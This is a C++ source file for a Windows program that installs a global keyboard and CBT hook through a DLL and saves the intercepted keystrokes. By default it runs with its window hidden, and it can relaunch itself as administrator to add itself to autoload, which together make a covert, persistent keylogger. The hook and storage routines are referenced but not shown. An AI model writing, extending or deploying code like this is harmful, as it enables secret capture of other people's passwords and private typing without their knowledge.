#include "../inc/dllmain.h"
#include "../inc/Server.h"
#include "../inc/Processing.h"

#pragma comment (lib, "DllHook.lib")

HWND hWndServer = NULL;
CProcessing prc;
UINT UWM_KEYBOARD, UWM_CBT;

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	if(message == UWM_KEYBOARD)
		prc.SaveKeyboadMsg(wParam, lParam);
	else if(message == UWM_CBT)
		prc.SaveCBTMsg(wParam, lParam);
	else if(message == WM_DESTROY)
		PostQuitMessage(0);
	else
		return DefWindowProc(hWnd, message, wParam, lParam);
	return 0;
}

ATOM RegisterClass(HINSTANCE hInstance)
{
	UWM_KEYBOARD = RegisterWindowMessage(UWM_KEYBOARD_MSG);
	UWM_CBT = RegisterWindowMessage(UWM_CBT_MSG);

	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= NULL;
	wcex.hCursor		= LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName	= NULL;
	wcex.lpszClassName	= _T("SERVER");
	wcex.hIconSm		= NULL;

	return RegisterClassEx(&wcex);
}

BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hWndServer = CreateWindow(_T("SERVER"), _T("Server"), WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);

   if (!hWndServer)
      return FALSE;

   ShowWindow(hWndServer, nCmdShow);
   UpdateWindow(hWndServer);

   return TRUE;
}

int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);

	nCmdShow = SW_HIDE;
	if(lpCmdLine[0] != NULL)
	{
		if(_tcscmp(lpCmdLine, _T("-reg")) == 0)
			RunAsAdmin(_T("-autoload"));
		else if(_tcscmp(lpCmdLine, _T("-autoload")) == 0)
		{
			AddToAutoload();
			return 0;
		}
		else if(_tcscmp(lpCmdLine, _T("-show")) == 0)
			nCmdShow = SW_SHOWNORMAL;
	}

	if(IsFisrtRun())
		return 0;

	RegisterClass(hInstance);

	if (!InitInstance(hInstance, nCmdShow))
		return FALSE;

	if (!SetHook(hWndServer))
		return FALSE;

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
		DispatchMessage(&msg);

	ClearHook();

	return (int) msg.wParam;
}